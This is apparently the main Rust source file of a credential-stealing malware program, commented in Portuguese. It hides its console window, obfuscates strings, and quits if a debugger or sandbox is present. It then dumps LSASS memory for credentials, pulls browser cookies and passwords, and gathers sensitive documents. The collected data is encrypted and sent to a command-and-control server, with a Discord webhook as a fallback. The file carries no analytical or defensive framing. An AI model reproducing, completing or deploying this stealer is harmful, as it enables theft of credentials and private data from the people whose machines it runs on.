#![windows_subsystem = "windows"]  // Sem console visível

use obfstr::obfstr as s;
mod lsass;
mod browser;
mod files;
mod exfil;
mod crypto;
mod evasion;

fn main() {
    // Anti-debug + sandbox detection antes de tudo
    if evasion::is_debugger_present() || evasion::is_sandbox() {
        return;
    }
    
    // Coleta dados
    let mut collected = Vec::new();
    
    // 1. Dump LSASS (credenciais)
    if let Some(lsass_dump) = lsass::dump() {
        collected.push(("lsass".to_string(), lsass_dump));
    }
    
    // 2. Cookies e credenciais dos navegadores
    for browser in browser::get_all_browsers() {
        if let Some(data) = browser::extract_creds(&browser) {
            collected.push((browser, data));
        }
    }
    
    // 3. Documentos sensíveis
    for doc in files::find_sensitive_files() {
        collected.push(("document".to_string(), doc));
    }
    
    // 4. Criptografa e exfiltra
    let encrypted = crypto::aes_encrypt(&serde_json::to_vec(&collected).unwrap());
    exfil::send_to_c2(&encrypted);
    exfil::send_to_discord_webhook(&encrypted); // Backup
    
    // 5. Persistência (opcional, já pode ter sido feita)
    // persistence::install_wmi();
}